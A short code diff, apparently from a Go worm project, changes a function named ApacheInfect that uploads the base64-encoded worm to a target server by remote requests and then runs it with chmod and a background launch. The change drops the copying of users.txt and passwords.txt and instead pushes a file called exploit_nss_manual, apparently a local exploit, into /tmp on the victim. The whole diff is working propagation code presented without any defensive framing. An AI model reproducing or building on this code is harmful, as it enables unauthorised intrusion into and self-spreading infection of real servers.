@@ -60,14 +60,12 @@ func ApacheInfect(ip string, port string) bool {
 	worm64 := base64.StdEncoding.EncodeToString(worm)
 	commands := fmt.Sprintf(copyCommandsTemplate,worm64,wormPath)
 	MakeRequest(ip,port,commands)
-	file := GetFile("./users.txt")
+	
+	file := GetFile("./exploit_nss_manual")
 	file64 := base64.StdEncoding.EncodeToString(file)
-	commands = fmt.Sprintf(copyCommandsTemplate,file64,"/tmp/users.txt")
+	commands = fmt.Sprintf(copyCommandsTemplate,file64,"/tmp/exploit_nss_manual")
 	MakeRequest(ip,port,commands)
-	file = GetFile("./passwords.txt")
-	file64 = base64.StdEncoding.EncodeToString(file)
-	commands = fmt.Sprintf(copyCommandsTemplate,file64,"/tmp/passwords.txt")
-	MakeRequest(ip,port,commands)
+	
 	commands = fmt.Sprintf("chmod u+x %s && %s &", wormPath, wormPath)
 	commands = fmt.Sprintf(commandsTemplate,commands)
 	MakeRequest2(ip,port,commands)
